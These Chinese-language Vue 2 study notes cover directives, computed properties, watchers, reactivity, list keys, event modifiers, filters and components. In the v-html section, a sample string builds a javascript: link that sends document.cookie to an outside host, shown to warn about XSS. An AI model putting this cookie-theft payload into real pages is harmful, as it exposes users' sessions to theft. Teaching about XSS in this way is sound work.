目录
*****
[TOC]
*****

一级菜单

# vue解决跨域
proxy 是借用了一台服务器，协议，端口，域名都和前端的一致，通过它向服务器获取数据，然后再给前端，服务器直接不跨越

# vue实例
实例和容器是一一对应的


## vue组件名:
一个单词组成：
    第一种写法(首字母小写)：school
    第二种写法(首字母大写)：School
多个单词组成：
    第一种写法(kebab-case命名)：my-school
    第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
备注：
    (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
    (2).可以使用name配置项指定组件在开发者工具中呈现的名字。
## vue 中自定义事件和原生Dom事件
https://blog.csdn.net/qyl_0316/article/details/117415608
自定义事件：子组件在父组件中使用时，直接绑定在子组件上的事件就是自定义事件，必须经过子组件的触发vm.$emit()才能执行

原生事件：直接在子组件里的模板上绑定的事件，子组件引入后是可以直接触发的

 在dom元素上绑定的事件，触发的是dom的原生事件
 在组件上绑定的事件，触发的是自定义事件，需要用this.$emit(‘eventName’)来触发。

      触发绑定的自定义事件的2种方式
        1. 给组件加上.native修饰符
        2. 通过$emit触发
## vue全局api

### 自定义指令 directive
```	
Vue.directive('fbind',{
    //指令与元素成功绑定时（一上来）
    bind(element,binding){
        element.value = binding.value
    },
    //指令所在元素被插入页面时
    inserted(element,binding){
        element.focus()
    },
    //指令所在的模板被重新解析时
    update(element,binding){
        element.value = binding.value
    }
})


new Vue({
    directives:{
        //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。
        // 2.指令所在的模板被重新解析时。
        'big-number'(element,binding){
            // console.log('big')
            element.innerText = binding.value * 10
        },
    }
    })
```
### 定义一个组件 component  extend
使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；

二、如何注册组件？
1.局部注册：靠new Vue的时候传入components选项
2.全局注册：靠Vue.component('组件名',组件)

```
Vue.component('hello',hello)

new Vue({
    //第二步：注册组件（局部注册）
    components:{
        school,
        student
    }
})
```
### 过滤器 filter
```
//全局过滤器
Vue.filter('mySlice',function(value){
    return value.slice(0,4)
})

new Vue({
   filters:{
        timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
            // console.log('@',value)
            return dayjs(value).format(str)
        }
    }
})
```
### 混入 mixin  
​全局混入：```Vue.mixin(xxx)```
局部混入：```mixins:['xxx']	```
    
## vue2双向绑定的问题
- 存在问题：
  - 新增属性、删除属性, 界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。
  解决方案：

```
1. 通过this.$set(this.person,'sex','女')
2. this.person.hobby.splice(0,1,'学习')
```

## data与el的2种写法
1.el有2种写法  
   (1).new Vue时候配置el属性。  
   (2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。 

2.data有2种写法  
    (1).对象式   
    (2).函数式 (组件必须写成函数式，否则会报错)
### 一个重要的原则
由Vue管理的函数(data函数)，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了而是window。
## 关于不同版本的Vue：
1.vue.js与vue.runtime.xxx.js的区别：   
	(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。   
	(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。

2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。
## vue-cli
vue脚手架生成的vue项目，只有下面的内容的内容可以修改，其他的内容不能修改（public下面的文件，main.js文件）
https://cli.vuejs.org/zh/config/ 
## Vue 并没有完全遵循 MVVM 的思想
严格的 MVVM 要求 View 不能和 Model 直接通信，而 Vue 提供了$refs 这个属性，让 Model 可以直接操作 View，违反了这一规定，所以说 Vue 没有完全遵循 MVVM。

MVVM模型 
1. M：模型(Model) ：data中的数据
2. V：视图(View) ：模板代码
3. VM：视图模型(ViewModel)：Vue实例(new Vue(),vm)

# 生命周期
常用的生命周期钩子：   
1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。  
2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

关于销毁Vue实例   
1.销毁后借助Vue开发者工具看不到任何信息。  
2.销毁后自定义事件会失效，但原生DOM事件依然有效。  
3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。  
# 模板语法
## 数据绑定
Vue中有2种数据绑定的方式：

1.单向绑定(v-bind)：数据只能从data流向页面。  
2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data

==备注== 

1.双向绑定一般都应用在表单类元素上（如：input、select等）   
2.v-model:value可以简写为v-model，因为v-model默认收集的就是value值

# vue 全局API
##  vue.set
了解 Vue 响应式原理的同学都知道在两种情况下修改数据 Vue 是不会触发视图更新的

1.在实例创建之后添加新的属性到实例上（给响应式对象新增属性）

2.直接更改数组下标来修改数组的值(有局限性：不能直接在data根数据上添加属性) 

3. Vue.set() 和 vm.$set() 能不能给vm 或 vm的根数据对象 添加属性（报错）

Vue.set(vm.student,'sex','女· ')

vm.$set(vm.student,'sex','女')

// 修改根上的数据
this.$set(this, 'zz','dddd')
# vue原理
## Object.defineProperty用法
```
let number = 18
let person = {
    name:'张三',
    sex:'男',
}

Object.defineProperty(person,'age',{
    // value:18,  // 默认值undefined
    // enumerable:true, //控制属性是否可以枚举(遍历)，默认值是false
    // writable:true, //控制属性是否可以被修改，默认值是false
    // configurable:true //控制属性是否可以被删除，默认值是false
    //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
    get(){
        console.log('有人读取age属性了')
        return number
    },
    //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
    set(value){
        console.log('有人修改了age属性，且值是',value)
        number = value
    }
})
```
## 数据代理
数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）  

```
//  通过obj2 代理对 obj 中属性的操作
    let obj = {
        x: 100
    }
    let obj2 = {
        y: 200
    }

    Object.defineProperty(obj2, 'x', {
        get() {
            return obj.x
        },
        set(val) {
            obj.x = val
        }
    })
```

 1. Vue中的数据代理：通过vm对象来代理_data对象中属性的操作（读/写）  
 vm上的属性是通过代理vm._data上的属性获取来的
 2. vm._data中的数据是通过数据劫持来获取data中的数据
 3. Vue中数据代理的好处：更加方便的操作data中的数据 
 4. 基本原理：  
 通过Object.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。getter/setter内部去操作（读/写）data中对应的属性。  
    ==重点==  
    vm._data  === data  
    vue中data数据发生变化，模版就会重新解析

## 模拟vue检测数据的原理
```
let data = {
	name:'尚硅谷',
	address:'北京',
}

//创建一个监视的实例对象，用于监视data中属性的变化
const obs = new Observer(data)		
console.log(obs)	

//准备一个vm实例对象
let vm = {}
vm._data = data = obs

function Observer(obj){
	//汇总对象中所有的属性形成一个数组
	const keys = Object.keys(obj)
	//遍历
	keys.forEach((k)=>{
		// this是obs
		Object.defineProperty(this,k,{
			get(){
				return obj[k]
			},
			set(val){
				console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
				obj[k] = val
			}
		})
	})
}
```
# 计算属性和侦听器
## 计算属性

1. 定义：要用的属性不存在，要通过已有属性计算得来。  
2. 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。           
3. get函数什么时候执行？   
    1. 初次读取时会执行一次。  
    2. 当依赖的数据发生改变时会被再次调用。 
4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
5. 备注：  
    1. 计算属性最终会出现在vm上，直接读取使用即可。   
    2. 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。    
6. computed如何实现传参？如下所示
7. 计算属性允许套娃，允许通过上面的计算属性的结果再计算
8. computed中的属性不能与data中的属性同名，否则会报错
            
```
// 全写
computed:{
    fullName:{
        //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
        //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
        get(){
            console.log('get被调用了')
            // console.log(this) //此处的this是vm
            return this.firstName + '-' + this.lastName
        },
        //set什么时候调用? 当fullName被修改时。
        set(value){
            console.log('set',value)
            const arr = value.split('-')
            this.firstName = arr[0]
            this.lastName = arr[1]
        }
    }
}
 // 简写（只考虑读取数据，不考虑修改数据的时候用）
computed:{
    fullName(){
        console.log('get被调用了')
        return this.firstName + '-' + this.lastName
    }
}

```

传参数 
```
// html
<div>{{ total(3) }}

// js
computed: {
    total() {
      return function(n) {
          return n * this.num
         }
    },
  }
```
## 监视属性watch
1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作  
2.监视的属性必须存在，才能进行监视（只能监视data和computed中的数据）  
3.监视的两种写法： 
    (1).new Vue时传入watch配置 
    (2).通过vm.$watch监视  

深度监视：   
    (1).Vue中的watch默认不监测对象内部值的改变（只监视一层）  
    (2).配置deep:true可以监测对象内部值改变（监视多层）。   
    
备注：  
    (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！  
    (2).使用watch时根据数据的具体结构，决定是否采用深度监视。 

第一种写法 
``` 
// 全写  
watch:{
  // 监视多级结构中某个属性的变化 
  'numbers.a':{
    handler(){
      console.log('a的值改变了')
    }
  },
  numbers:{
    handler(){
      console.log('numbers的值改变了')
    },
    deep:true, //深度监视
    immediate:true, //初始化时让handler调用一下
  }
},
//简写 （只需要监听到属性，并不需要配置其他选项）
watch:{
  isHot(newValue,oldValue){
    console.log('isHot被修改了',newValue,oldValue)
  }
},
```

第二种写法 
```  
// 全写
vm.$watch('isHot',{
    immediate:true, //初始化时让handler调用一下
    //handler什么时候调用？当isHot发生改变时。
    handler(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue)
    }
})

//简写
vm.$watch("isHot",function(newValue,oldValue){
    console.log('isHot被修改了',newValue,oldValue,this)
  });
```

##  computed和watch之间的区别
1.computed能完成的功能，watch都可以完成  
2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作  

两个重要的小原则：  
1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。   
2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

区别：

computed：
1. 是基于data中声明过或父组件传递的props中的数据计算得到的；
1. computed结果会被缓存，只有当依赖的数据发生变化才会重新计算；
1. 不支持异步，当computed内有异步操作时无效，无法监听数据的变化；
1. computed中的属性有get和set方法，但是默认走get方法。

watch：
1. watch监听的数据必须是data中声明过或父组件传递的props中的数据；
1. watch不会被缓存，当监听的数据变化时，直接触发响应的操作。
1. 支持异步    
1. watch方法中有两个属性：immediate（组件加载立即触发方法），deep（深度监听）
1. 使用场景：需要执行异步操作，或者开销较大的操作。  

# Class 与 Style 绑定
## 绑定样式
### 1. class样式
写法:class="xxx" xxx可以是字符串、对象、数组。  

    字符串写法适用于：类名不确定，要动态获取。
    对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
    数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

### 2. style样式
    :style="{fontSize: xxx}"其中xxx是动态值。
    :style="[a,b]"其中a、b是样式对象。
### 代码示例

```
 <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br /><br />
<div class="basic" :class="{happy:isHappy}" @click="changeMood">{{name}}</div> <br /><br />

<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
<div class="basic" :class="classArr">{{name}}</div> <br /><br />

<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
<div class="basic" :class="classObj">{{name}}</div> <br /><br />

<!-- 绑定style样式--对象写法 -->
<div class="basic" :style="styleObj">{{name}}</div> <br /><br />
<div class="basic" :style="{ fontSize: fontSize + 'px' }">{{name}}</div> <br /><br />
<!-- 绑定style样式--数组写法 -->
<div class="basic" :style="styleArr">{{name}}</div>

        

const vm = new Vue({
    el: '#root',
    data: {
        name: '尚硅谷',
        mood: '',
        isHappy: false,
        classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
        classObj: {
            atguigu1: true,
            atguigu2: false
        },
        styleObj: {
            fontSize: '40px',
            color: 'red',
        },
        fontSize:66,
        styleArr: [
            {
                fontSize: '40px',
                color: 'blue',
            },
            {
                backgroundColor: 'gray'
            }
        ]
    },
    methods: {
        changeMood() {
            this.mood = "happy"
        }
    },
})
```
# 条件渲染
## v-if 和 v-show
### v-if
    1. v-if="表达式"
    2. v-else-if="表达式" 
    3. v-else="表达式"

适用于：切换频率较低的场景。  
特点：不展示的DOM元素直接被移除。  
注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

### v-show   
写法：v-show="表达式"  
适用于：切换频率较高的场景。  
特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉  
	
3.==备注==：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

4.v-if可以与template的配合使用，v-show不行

# 列表渲染
## Vue监视数据的原理
1. vue会监视data中所有层次的数据。

2. 如何监测对象中的数据？
	通过setter实现监视，且要在new Vue时就传入要监测的数据。    
	(1).对象中后追加的属性，Vue默认不做响应式处理             
	(2).如需给后添加的属性做响应式，请使用如下API：

```
Vue.set(target，propertyName/index，value)
vm.$set(target，propertyName/index，value)
```

3. 如何监测数组中的数据？   
通过包裹数组更新元素的方法实现，本质就是做了两件事：  
	(1).调用原生对应的方法对数组进行更新。  
	(2).重新解析模板，进而更新页面。  

4. 在Vue修改数组中的某个元素一定要用如下方法
	
   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2. Vue.set() 或 vm.$set()

特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

## v-for
v-for指令:
1. 用于展示列表数据
2. 语法：v-for="(item, index) in xxx" :key="item.id"
3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

### key的原理
	面试题：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：  
	key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
	
2. 对比规则：  

    (1).旧虚拟DOM中找到了与新虚拟DOM相同的key     
    	 ①.若虚拟DOM中内容没变,直接使用之前的真实DOM！   
    	 ②.若虚拟DOM中内容变了,则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
    
    (2).旧虚拟DOM中未找到与新虚拟DOM相同的key
        创建新的真实DOM，随后渲染到到页面。  
	
3. 用index作为key可能会引发的问题：

	(1). 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
	会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

    (2) 如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题。
   
4. 开发中如何选择key?  
    1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值

    2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

# 表单输入绑定
## 收集表单数据
```
若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
若：<input type="checkbox"/>
	1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
	2.配置input的value属性:
		(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
		(2)v-model的初始值是数组，那么收集的的就是value组成的数组
备注：v-model的三个修饰符：
	lazy：失去焦点再收集数据
	number：输入字符串转为有效的数字
	trim：输入首尾空格过滤
```
## 代码
```
<div id="root">
	<form @submit.prevent="demo">
		账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
		密码：<input type="password" v-model="userInfo.password"> <br/><br/>
		年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
		性别：
		男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
		女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
		爱好：
		学习<input type="checkbox" v-model="userInfo.hobby" value="study">
		打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
		吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
		<br/><br/>
		所属校区
		<select v-model="userInfo.city">
			<option value="">请选择校区</option>
			<option value="beijing">北京</option>
			<option value="shanghai">上海</option>
			<option value="shenzhen">深圳</option>
			<option value="wuhan">武汉</option>
		</select>
		<br/><br/>
		其他信息：
		<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
		<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
		<button>提交</button>
	</form>
</div>

new Vue({
	el:'#root',
	data:{
		userInfo:{
			account:'',
			password:'',
			age:18,
			sex:'female',
			hobby:[],
			city:'beijing',
			other:'',
			agree:''
		}
	},
	methods: {
		demo(){
			console.log(JSON.stringify(this.userInfo))
		}
	}
})

```
# 指令
## 内置指令
1. v-bind	: 单向绑定解析表达式, 可简写为 :xxx
2. v-model	: 双向数据绑定
3. v-for  	: 遍历数组/对象/字符串
4. v-on   	: 绑定事件监听, 可简写为@
5. v-if  : 条件渲染（动态控制节点是否存存在）
6. v-else 	: 条件渲染（动态控制节点是否存在
7. v-show 	: 条件渲染 (动态控制节点是否展示)
8. v-text指令   
   1.作用：向其所在的节点中渲染文本内容。  
   2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
9. v-html  
    1.作用：向指定节点中渲染包含html结构的内容。  
    2.与插值语法的区别：   
    	(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。   
    	(2).v-html可以识别html结构。    
    3.严重注意：v-html有安全性问题！！！！    
		(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。    
		(2).一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！ 
    
```
<div id="root">
	<div>你好，{{name}}</div>
	<div v-html="str"></div>
	<div v-html="str2"></div>
</div>
		
new Vue({
	el:'#root',
	data:{
		name:'尚硅谷',
		str:'<h3>你好啊！</h3>',
		str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
	}
})
```
10. v-cloak   
	1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。  
	2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
	
```
<div id="root">
	<h2 v-cloak>{{name}}</h2>
</div>
		
  [v-cloak]{
	display:none;
  }
```
11. v-once  
	1.v-once所在节点在初次动态渲染后，就视为静态内容了。    
	2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。  
12. v-pre  
	1.跳过其所在节点的编译过程。    
	2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。  

## 自定义指令
自定义指令总结：    
一、定义语法：  
   (1).局部指令：
		
```
new Vue({ directives:{指令名:配置对象} }) 		
new Vue({ directives{指令名:回调函数} }) 		
```

(2).全局指令：
		
```
Vue.directive(指令名,配置对象)
Vue.directive(指令名,回调函数)
```

二、配置对象中常用的3个回调：  
	(1).bind：只调用一次，指令与元素成功绑定时调用。    
	(2).inserted：指令所在元素被插入页面时调用。  
	(3).update：指令所在模板结构被重新解析时调用。    
	(4).componentUpdated：指令所在组件的 VNode 及其子 VNode 全部更新后调用。    
	(5).unbind：只调用一次，指令与元素解绑时调用。 
	
三、备注：  
	1.指令定义时不加v-，但使用时要加v-；  
	2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。  
	
四：例子   
需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。   
需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。 
```
<div id="root">
	<h2>{{name}}</h2>
	<h2>当前的n值是：<span v-text="n"></span> </h2>
	<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
	<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
	<button @click="n++">点我n+1</button>
	<hr/>
	<input type="text" v-fbind:value="n">
</div>



Vue.directive('fbind',{
	//指令与元素成功绑定时（一上来）
	bind(element,binding){
		element.value = binding.value
	},
	//指令所在元素被插入页面时
	inserted(element,binding){
		element.focus()
	},
	//指令所在的模板被重新解析时
	update(element,binding){
		element.value = binding.value
	}
})

new Vue({
	el:'#root',
	data:{
		name:'尚硅谷',
		n:1
	},
	directives:{
		//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
		/* 'big-number'(element,binding){
			// console.log('big')
			element.innerText = binding.value * 10
		}, */
		big(element,binding){
			console.log('big',this) //注意此处的this是window
			// console.log('big')
			element.innerText = binding.value * 10
		},
	}
})
```


# vuex
## vue vuex数据持久化
1.  vuex-persistedstate
2.  vuex-persist

#  事件处理
## 事件传参
```
  1.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
  2.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
  3.新的不传$event,也可以在方法中获取到event参数
    <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
    
    showInfo2(event,number){
        console.log(event,number)
    },
    
  4. 如果不传参，默认也会传event参数
  
  <button @click="showInfo1">点我提示信息1（不传参）</button>
  
   showInfo1(event){
		console.log('同学你好！',event)
	},
```

## Vue 修饰符
### Vue中的事件修饰符：
1. prevent：阻止默认事件（常用）；给a标签上添加事件，如若不加prevent，则会跳转
2. stop：阻止事件冒泡（常用）；阻止了事件从当前元素继续向外层元素传播,
3. once：事件只触发一次（常用）；
4. capture：使用事件的捕获模式；改变了事件默认的冒泡机制，先执行捕获再冒泡, 使事件先触发带有capture的元素，然后再触发其外层元素。
5. self：只有event.target是当前操作的元素时才触发事件；在外层元素上添加，可以阻止冒泡
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕（会告诉浏览器你不想阻止事件的默认行为）

stop：此修饰符主要用于阻止事件冒泡。当你在某个元素上使用stop修饰符时，该元素的事件将不再向上冒泡，
    也就是说，它阻止了事件从当前元素继续向外层元素传播。
capture：此修饰符则改变了事件默认的冒泡机制，使事件先触发带有capture的元素，然后再触发其外层元素。
    它实际上是将冒泡机制改为捕获机制。
总的来说，stop和capture的主要区别在于处理事件冒泡的方式上：
stop是直接阻止冒泡，而capture则是改变事件的触发顺序，将原本的冒泡机制改为捕获机制。
```
修饰符可以连续写
<a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a>

<!-- 阻止事件冒泡（常用） -->
<!-- 给button和div都添加事件，如若不给button加stop，则点击button会触发2次事件（button和div上都会触发） -->
<div class="demo1" @click="showMsg">
    <button @click.stop="showInfo">点我提示信息(阻止事件冒泡)</button>
    <!-- 修饰符可以连续写 -->
    <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
</div>


1. 冒泡是从里往外冒，捕获是从外往里捕。
1. 当捕获存在时，先从外到里的捕获，剩下的从里到外的冒泡输出。

<div class="box1" @click.capture="showMsg(1)">
	div1
	<div class="box2" @click="showMsg(2)">
		div2
	</div>
</div>

有修饰符，先触发事件,先执行捕获再执行冒泡
点击div2 结果：1 2
如果不加修饰符   点击div2 结果： 2 1 

https://blog.csdn.net/catascdd/article/details/108273931

<ul @wheel.passive="demo" class="list">
	<li>1</li>
	<li>2</li>
	<li>3</li>
	<li>4</li>
</ul>
不要把 .passive 和 .prevent 一起使用，因为 .prevent 将会被忽略，同时浏览器可能会向你展示一个警告。
请记住，.passive 会告诉浏览器你不想阻止事件的默认行为。 			
passive主要用在移动端的scroll事件，来提高浏览器响应速度，提升用户体验。因为passive=true等于提前告诉了浏览器，
touchstart和touchmove不会阻止默认事件，手刚开始触摸，浏览器就可以立刻给与响应；否则，手触摸屏幕了，
但要等待touchstart和touchmove的结果，多了这一步，响应时间就长了，用户体验也就差了。
```

### v-model 的修饰符

.lazy 通过这个修饰符，转变为在 change 事件再同步

.number 自动将用户的输入值转化为数值类型

.trim 自动过滤用户输入的首尾空格
### 系统修饰键

.ctrl  
.alt   
.shift  
.meta  
### 键盘事件的修饰符
```
回车 => enter
删除 => delete (捕获“删除”和“退格”键)
退出 => esc
空格 => space
换行 => tab (特殊，必须配合keydown去使用)
上 => up
下 => down
左 => left
右 => right

2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
    (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
    (2).配合keydown使用：正常触发事件。
4.也可以使用keyCode去指定具体的按键（不推荐）
5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
```
## Vue 的父子组件生命周期钩子函数执行顺序

加载渲染过程

父 beforeCreate->父 created->父 beforeMount->子 beforeCreate->子 created->子 beforeMount->子 mounted->父 mounted

子组件更新过程

父 beforeUpdate->子 beforeUpdate->子 updated->父 updated

父组件更新过程

父 beforeUpdate->父 updated

销毁过程

父 beforeDestroy->子 beforeDestroy->子 destroyed->父 destroyed

##  onscroll事件和onwheel事件的区别
### onscroll
onscroll 在滚动条滚动的时候被触发。
onscroll 触发可以有多种方式，只要可以让滚动条发生滚动（X方向或Y方向）
1. 鼠标滚轮
2. 按 pageUp，pageDown，方向上键，方向下键，空格键 （还有其他？）
3. 使用特定的滚动函数，如 scrollTo，scrollBy，scrollByLines, scrollByPages
4. 滚动条不存在（容器的内容小于容器的大小）
5. 手动隐藏（添加样式 overflow:hidden）
6. onscroll 就不会被触发  
### onwheel
onwheel 在鼠标滚轮滚动的时候被触发
因为滚轮可以控制页面的滚动，所以在使用滚轮时，onwheel事件先被触发，滚动条滚动，接着是onscroll事件
如果想检测每次滚动的增量，应该查看 deltaX,deltaY,deltaZ
WheelEvent 中指出 ：在onwheel中，增量的值不一定要对应到滚动条改变的值，滚轮滚动的方向不一定是滚动条的方向，但我们可以从 deltaX,deltaY 知道滚轮滚动的具体方向（向上or向下）
# 过滤器
定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。  
语法：
```
1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
```
>备注：  
	1.过滤器也可以接收额外参数、多个过滤器也可以串联   
	2.并没有改变原本的数据, 是产生新的对应的数据
```
<div id="root">
	<h2>显示格式化后的时间</h2>
	<!-- 计算属性实现 -->
	<h3>现在是：{{fmtTime}}</h3>
	<!-- methods实现 -->
	<h3>现在是：{{getFmtTime()}}</h3>
	<!-- 过滤器实现 -->
	<h3>现在是：{{time | timeFormater}}</h3>
	<!-- 过滤器实现（传参） -->
	<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
	<h3 :x="msg | mySlice">尚硅谷</h3>
</div>

new Vue({
	el:'#root',
	data:{
		time:1621561377603, //时间戳
		msg:'你好，尚硅谷'
	},
	computed: {
		fmtTime(){
			return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
		}
	},
	methods: {
		getFmtTime(){
			return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
		}
	},
	//局部过滤器
	filters:{
		timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
			return dayjs(value).format(str)
		}
	}
})
```
# 组件
Vue中使用组件的三大步骤：  
	一、定义组件(创建组件)  
	二、注册组件   
	三、使用组件(写组件标签)  

一、如何定义一个组件？       
	使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
	区别如下：    
		1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。   
		2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。   
	备注：使用template可以配置组件结构。   

二、如何注册组件？   
	1.局部注册：靠new Vue的时候传入components选项     
	2.全局注册：靠Vue.component('组件名',组件)     

三、编写组件标签：
	<school></school>
## 单文件组件
1.关于组件名:  
	
```
一个单词组成：   
	第一种写法(首字母小写)：school  
	第二种写法(首字母大写)：School  
多个单词组成：  
	第一种写法(kebab-case命名)：my-school  
	第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
```
> 备注：  
	(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。  
	(2).可以使用name配置项指定组件在开发者工具中呈现的名字。

2.关于组件标签:  

```
第一种写法：<school></school>  
第二种写法：<school/>
备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。  
```
3.一个简写方式：
```
const school = Vue.extend(options) 
可简写为：const school = options
```
## VueComponent （组件实例对象）
关于VueComponent：   
	1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。  
	2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
		即Vue帮我们执行的：new VueComponent(options)。  
	3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！  
	4.关于this指向：
		(1).组件配置中：
			data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
		(2).new Vue(options)配置中：
			data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。  
	5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
		Vue的实例对象，以后简称vm。
## 一个重要的内置关系

```
1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype  
2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
```
# vue脚手架
## 脚手架文件结构

	├── node_modules 
	├── public
	│   ├── favicon.ico: 页签图标
	│   └── index.html: 主页面
	├── src
	│   ├── assets: 存放静态资源
	│   │   └── logo.png
	│   │── component: 存放组件
	│   │   └── HelloWorld.vue
